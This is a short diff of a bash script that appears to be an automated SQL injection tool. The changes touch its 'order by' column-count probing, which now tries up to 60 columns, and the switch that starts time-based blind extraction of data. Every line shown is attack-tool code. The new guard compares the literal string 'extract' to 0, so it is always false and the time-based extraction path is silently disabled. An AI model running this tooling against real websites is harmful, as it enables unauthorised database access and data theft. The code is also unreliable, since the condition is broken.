@@ -261,8 +261,8 @@ fi
 orderbyrequest()
 {
 count=1
-columns=1
-#change this back to 150!!!
+#this sets the max number of columns we will check for in a table: 
+columns=60
 while [[ $count -lt $columns ]] ; do
 		if [ true = "$O" ] ; then #uri unicode encoding
 			uriinputencode="1$quote order by $count$end"
@@ -292,7 +292,7 @@ orderbyrequestlength()
 {
 echo "Using 'order by x' and response length diffing to determine the number of columns"
 count=1
-columns=1
+columns=60
 while [[ $count -lt $columns ]] ; do
 	echo -n "."
 	if [ true = "$Z" ] ; then echo "DEBUG! sending order by req: $badparams" ; fi
@@ -2359,11 +2359,11 @@ fi
 
 #uncomment the below when timebased extraction is done...
 
-#if [[ "extract" == 0 ]] ; then
-#	#status/length diffing didnt work - lets try time based diffing:
-#	lettergrabtimebased
-#fi
-lettergrabtimebased
+if [[ "extract" == 0 ]] ; then
+	#status/length diffing didnt work - lets try time based diffing:
+	lettergrabtimebased
+fi
+#lettergrabtimebased
 
 }
 
